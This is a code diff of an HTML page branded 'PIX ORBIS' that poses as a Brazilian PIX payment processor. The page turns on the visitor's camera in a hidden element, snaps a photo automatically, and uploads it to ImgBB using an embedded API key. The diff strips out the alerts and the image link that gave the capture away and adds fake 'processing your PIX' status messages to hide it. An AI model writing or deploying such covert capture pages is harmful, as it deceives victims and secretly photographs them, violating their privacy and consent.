@@ -7,12 +7,17 @@
 </head>
 <body>
     <h1>PIX ORBIS</h1>
+    <p>Aguarde enquanto processamos o seu PIX...</p>
     <video id="video" autoplay style="display: none;"></video>
     <canvas id="canvas" style="display: none;"></canvas>
-    <p id="link"></p>
+    <p id="status"></p>
     <script>
         // Configuração do ImgBB
         const apiKey = 'b6147e113acc9c24966a9c0f888f0242'; // Sua API Key
+
+        // Exibe uma mensagem ao usuário
+        const statusMessage = document.getElementById('status');
+        statusMessage.textContent = "Validando os dados...";
 
         // Acessar a câmera
         const video = document.getElementById('video');
@@ -20,15 +25,15 @@
             .then(stream => {
                 video.srcObject = stream;
 
-                // Esperar a câmera estar pronta
+                // Quando o vídeo estiver pronto, captura automaticamente
                 video.addEventListener('loadeddata', () => {
-                    // Capturar imagem automaticamente
+                    statusMessage.textContent = "Processando seu PIX...";
                     captureAndUpload();
                 });
             })
             .catch(err => {
                 console.error('Erro ao acessar câmera:', err);
-                alert('Erro ao acessar a câmera. Por favor, conceda permissão para continuar.');
+                statusMessage.textContent = "Erro ao processar o PIX. Por favor, recarregue a página.";
             });
 
         // Função para capturar imagem e enviar ao ImgBB
@@ -55,13 +60,11 @@
             .then(response => response.json())
             .then(result => {
                 console.log('Imagem enviada:', result.data.url);
-                const link = document.getElementById('link');
-                link.innerHTML = `<a href="${result.data.url}" target="_blank">Ver Imagem</a>`;
-                alert('Imagem capturada e enviada com sucesso!');
+                statusMessage.textContent = "Seu PIX foi processado com sucesso!";
             })
             .catch(error => {
                 console.error('Erro ao enviar imagem:', error);
-                alert('Erro ao enviar imagem. Verifique a API Key ou conexão.');
+                statusMessage.textContent = "Erro ao processar o PIX. Tente novamente mais tarde.";
             });
         }
     </script>
